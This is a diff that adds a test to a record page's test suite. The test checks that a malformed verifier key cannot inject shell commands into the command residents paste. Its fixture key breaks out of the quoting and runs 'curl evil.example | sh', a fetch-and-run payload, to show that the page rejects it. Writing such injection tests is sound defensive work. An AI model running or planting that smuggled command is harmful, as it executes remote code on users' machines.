@@ -542,6 +542,15 @@ describe("Checking the record page", () => {
     expect(copy).toEqual({ enabled: true, key: DESK_KEY, days: RECORD.days.map(({ day, size, note, ots }) => ({ day, size, note, ots })) });
   });
 
+  it("keeps a key that is not a verifier key out of the command residents paste", async () => {
+    const desk = new FakeDesk();
+    desk.record = { ...RECORD, key: "x+00000000+AA'; curl evil.example | sh; echo '" };
+    const target = await show(DeskRecord, { client: desk, origin: "https://cracia.example" });
+    const command = target.querySelector("[data-testid=command]")!.textContent!;
+    expect(command).toContain("--vkey '<key>'");
+    expect(command).not.toContain("curl");
+  });
+
   it("says so when the desk publishes no fingerprint, in the resident's language", async () => {
     const desk = new FakeDesk();
     desk.record = { enabled: false, key: null, days: [] };
